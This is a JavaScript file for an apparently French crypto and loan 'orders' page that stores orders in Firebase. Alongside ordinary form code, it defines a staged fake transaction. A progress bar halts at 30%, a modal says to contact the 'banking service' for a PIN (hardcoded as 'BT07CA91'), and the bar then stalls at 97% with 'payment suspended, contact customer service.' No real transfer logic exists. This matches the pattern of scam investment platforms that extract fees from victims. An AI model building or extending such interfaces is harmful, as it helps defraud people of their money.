// js/ordres.js
import { auth, db } from './firebase-config.js';
import {
    collection,
    addDoc,
    query,
    where,
    onSnapshot,
    orderBy
} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";

document.addEventListener('DOMContentLoaded', function () {
    // Initialisation des éléments
    const orderTypeSelect = document.getElementById('orderType');
    const assetSelect = document.getElementById('assetSelect');
    const amountInput = document.getElementById('amountInput');
    const limitInput = document.getElementById('limitInput');
    const form = document.querySelector('form');
    const ordersContainer = document.querySelector('.orders-container');

    // Options disponibles
    const allOptions = [
        { value: 'btc', text: 'Bitcoin (BTC)' },
        { value: 'eth', text: 'Ethereum (ETH)' },
        { value: 'usdt', text: 'Tether (USDT)' },
        { value: 'eur', text: 'Euro (EUR)' },
        { value: 'usd', text: 'Dollar (USD)' },
        { value: 'gbp', text: 'Livre Sterling (GBP)' }
    ];



    function loadUserOrders(userId) {
        const q = query(
            collection(db, "ordres"),
            where("userId", "==", userId),
            orderBy("createdAt", "desc")
        );

        onSnapshot(q, snapshot => {
            ordersContainer.innerHTML = "";

            if (snapshot.empty) {
                ordersContainer.innerHTML = `
                    <div class="no-orders">
                        <i class="fas fa-exchange-alt"></i>
                        <h4 class="mt-3" style="color: #fff;">Aucun ordre en cours</h4>
                        <p style="color: #fff;">Vos ordres actifs apparaîtront ici</p>
                    </div>
                `;
                return;
            }

            snapshot.forEach(doc => {
                const data = doc.data();
                const card = createOrderCard(data.type, data.assetLabel, data.montant);
                ordersContainer.appendChild(card);
            });
        });
    }

    // Gestion de l'authentification
    onAuthStateChanged(auth, user => {
        if (user) {
            const userId = user.uid;
            setupOrderForm(userId);
            loadUserOrders(userId);
            setupEventListeners();
        } else {
            alert("Veuillez vous connecter pour gérer vos ordres.");
            window.location.href = "connexion.html";
        }
    });

    function setupOrderForm(userId) {
        form.addEventListener('submit', async function (e) {
            e.preventDefault();

            const orderType = orderTypeSelect.value;
            const asset = assetSelect.value;
            const assetText = assetSelect.selectedOptions[0].textContent;
            const amount = parseFloat(amountInput.value);
            const timestamp = new Date();

            const ordreData = {
                type: orderType,
                asset: asset,
                assetLabel: assetText,
                montant: amount,
                userId: userId,
                statut: "en attente",
                createdAt: timestamp
            };

            try {
                await addDoc(collection(db, "ordres"), ordreData);
                console.log("Ordre enregistré !");
                form.reset();
                updateFormFields();
            } catch (error) {
                console.error("Erreur enregistrement :", error);
            }
        });
    }

    function setupEventListeners() {
        // Gestion des changements de type d'ordre
        orderTypeSelect.addEventListener('change', updateFormFields);

        // Gestion des boutons de type d'ordre
        document.querySelectorAll('.order-type-btn').forEach(btn => {
            btn.addEventListener('click', function () {
                document.querySelectorAll('.order-type-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                console.log(`Filtrer les ordres par type: ${this.dataset.type}`);
            });
        });

        // Animation des cartes
        document.querySelectorAll('.card-style, .order-card').forEach(card => {
            card.addEventListener('mouseenter', () => {
                card.style.transform = 'translateY(-5px)';
                card.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.1)';
            });

            card.addEventListener('mouseleave', () => {
                card.style.transform = '';
                card.style.boxShadow = '';
            });
        });

        // Navigation footer
        document.querySelectorAll('.nav-button').forEach(button => {
            button.addEventListener('click', function (e) {
                if (!this.classList.contains('active')) {
                    document.querySelectorAll('.nav-button').forEach(btn => btn.classList.remove('active'));
                    this.classList.add('active');
                }
            });
        });
    }

    function updateFormFields() {
        const orderType = orderTypeSelect.value;
        const assetLabel = document.getElementById('assetLabel');
        const amountLabel = document.getElementById('amountLabel');
        const limitLabel = document.getElementById('limitLabel');
        const rateInfo = document.getElementById('rateInfo');

        // Vider les options actuelles
        assetSelect.innerHTML = '';

        switch (orderType) {
            case 'limit':
                assetLabel.textContent = 'Solde principal';
                amountLabel.textContent = 'Montant du prêt';
                limitLabel.textContent = 'Total à rembourser';
                limitInput.readOnly = true;
                rateInfo.style.display = 'block';

                // Ajouter seulement EUR, USD, GBP
                allOptions.filter(opt => ['eur', 'usd', 'gbp'].includes(opt.value))
                    .forEach(currency => addOption(currency));

                amountInput.addEventListener('input', calculateRepayment);
                break;

            case 'transfer':
                assetLabel.textContent = 'Solde principal';
                amountLabel.textContent = 'Montant';
                limitLabel.textContent = 'Prix restant';
                limitInput.readOnly = false;
                rateInfo.style.display = 'none';

                // Ajouter toutes les options
                allOptions.forEach(currency => addOption(currency));

                amountInput.removeEventListener('input', calculateRepayment);
                break;

            case 'buy':
            case 'sell':
                assetLabel.textContent = 'Choix de cryptomonnaie';
                amountLabel.textContent = 'Montant';
                limitLabel.textContent = 'Valeur exacte de la cryptomonnaie';
                limitInput.readOnly = false;
                rateInfo.style.display = 'none';

                // Ajouter seulement les cryptos
                allOptions.filter(opt => ['btc', 'eth', 'usdt'].includes(opt.value))
                    .forEach(currency => addOption(currency));

                amountInput.removeEventListener('input', calculateRepayment);
                break;
        }
    }

    function addOption(currency) {
        const option = document.createElement('option');
        option.value = currency.value;
        option.textContent = currency.text;
        assetSelect.appendChild(option);
    }

    function calculateRepayment() {
        const amount = parseFloat(amountInput.value) || 0;
        limitInput.value = (amount * 1.03).toFixed(2);
    }

    function createOrderCard(type, asset, amount) {
        const typeData = {
            'buy': { label: 'Achat', class: 'buy' },
            'sell': { label: 'Vente', class: 'sell' },
            'transfer': { label: 'Transfert', class: 'transfer' },
            'limit': { label: 'Prêt', class: 'limit' }
        }[type];

        const card = document.createElement('div');
        card.id = 'order-' + Date.now(); // ID unique
        card.className = `order-card ${typeData.class} mb-3 p-3 d-flex align-items-center`;
        card.innerHTML = `
            <div class="flex-grow-1">
                <div class="fw-bold mb-1">${typeData.label} - ${asset}</div>
                <div>Montant : <span class="fw-semibold">${amount}</span></div>
                <div class="text-warning mt-2"><i class="fas fa-spinner fa-spin me-1"></i>Transfert en cours</div>
            </div>
        `;
        return card;
    }

    function showProgressAndPin(orderCard) {
        const progressDiv = document.createElement('div');
        progressDiv.className = 'mt-3 w-100';
        progressDiv.innerHTML = `
            <div class="progress" style="height: 18px;">
                <div class="progress-bar progress-bar-striped progress-bar-animated" 
                    role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
                    0%
                </div>
            </div>
        `;
        orderCard.appendChild(progressDiv);

        const progressBar = progressDiv.querySelector('.progress-bar');
        let progress = 0;
        const interval = setInterval(() => {
            progress += 2;
            if (progress > 30) progress = 30;
            progressBar.style.width = `${progress}%`;
            progressBar.setAttribute('aria-valuenow', progress);
            progressBar.textContent = `${progress}%`;

            if (progress >= 30) {
                clearInterval(interval);
                setTimeout(() => showPinPopup(orderCard), 300);
            }
        }, 100);
    }

    function showPinPopup(orderCard) {
        if (document.getElementById('pinModal')) return;

        const modalHtml = `
        <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);" aria-modal="true" role="dialog">
          <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
              <div class="modal-header">
                <h5 class="modal-title">Validation requise</h5>
              </div>
              <div class="modal-body">
              <p class="text-muted small mt-2">Veuillez contacter le service bancaire pour recevoir votre code PIN ou résoudre le problème.</p>
                <p>Veuillez intégrer votre code PIN pour valider la transaction :</p>
                <input type="password" class="form-control mb-2" id="pinInput" maxlength="8" placeholder="Code PIN">
                <div id="pinError" class="text-danger" style="display:none;">Code PIN incorrect.</div>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-secondary" id="cancelPinBtn">Annuler</button>
                <button type="button" class="btn btn-primary" id="validatePinBtn">Valider</button>
              </div>
            </div>
          </div>
        </div>
        `;

        const modalDiv = document.createElement('div');
        modalDiv.innerHTML = modalHtml;
        document.body.appendChild(modalDiv);

        setTimeout(() => document.getElementById('pinInput').focus(), 200);

        // Validation du PIN
        document.getElementById('validatePinBtn').onclick = function () {
            const pin = document.getElementById('pinInput').value.trim();
            if (pin !== "BT07CA91") {
                document.getElementById('pinError').style.display = 'block';
            } else {
                document.getElementById('pinError').style.display = 'none';
                document.getElementById('pinModal').remove();
                modalDiv.remove();
                continueProgressTo97(orderCard);
            }
        };

        // Annulation
        document.getElementById('cancelPinBtn').onclick = function () {
            document.getElementById('pinModal').remove();
            modalDiv.remove();
            addCancellationMessage(orderCard);
        };
    }

    function continueProgressTo97(orderCard) {
        const progressBar = orderCard.querySelector('.progress-bar');
        let progress = 30;

        progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
        progressBar.classList.add('bg-warning');

        const interval = setInterval(() => {
            progress += 2;
            if (progress > 97) progress = 97;
            progressBar.style.width = `${progress}%`;
            progressBar.setAttribute('aria-valuenow', progress);
            progressBar.textContent = `${progress}%`;

            if (progress >= 97) {
                clearInterval(interval);
                progressBar.classList.remove('bg-warning');
                progressBar.classList.add('bg-danger');
                addSuspensionMessage(orderCard);
            }
        }, 150);
    }

    function addSuspensionMessage(orderCard) {
        const messageDiv = document.createElement('div');
        messageDiv.className = 'alert alert-danger mt-2 mb-0';
        messageDiv.innerHTML = `
            <i class="fas fa-exclamation-triangle me-2"></i>
            Paiement suspendu - Veuillez contacter le service client
        `;
        orderCard.appendChild(messageDiv);

        const statusText = orderCard.querySelector('.text-warning');
        if (statusText) {
            statusText.innerHTML = '<i class="fas fa-pause-circle me-1"></i>En attente de validation';
            statusText.className = 'text-danger mt-2';
        }

        const progressBar = orderCard.querySelector('.progress-bar');
        if (progressBar) {
            progressBar.classList.remove('progress-bar-animated');
        }
    }

    function addCancellationMessage(orderCard) {
        const messageDiv = document.createElement('div');
        messageDiv.className = 'alert alert-danger mt-2 mb-0';
        messageDiv.innerHTML = `
            <i class="fas fa-times-circle me-2"></i>
            Transaction annulée - Code PIN non validé
        `;
        orderCard.appendChild(messageDiv);

        const statusText = orderCard.querySelector('.text-warning');
        if (statusText) {
            statusText.innerHTML = '<i class="fas fa-ban me-1"></i>Transaction annulée';
            statusText.className = 'text-danger mt-2';
        }

        const progressBar = orderCard.querySelector('.progress-bar');
        if (progressBar) {
            progressBar.style.width = '30%';
            progressBar.textContent = '30%';
            progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
            progressBar.classList.add('bg-secondary');
        }
    }

    // Initialisation
    updateFormFields();
});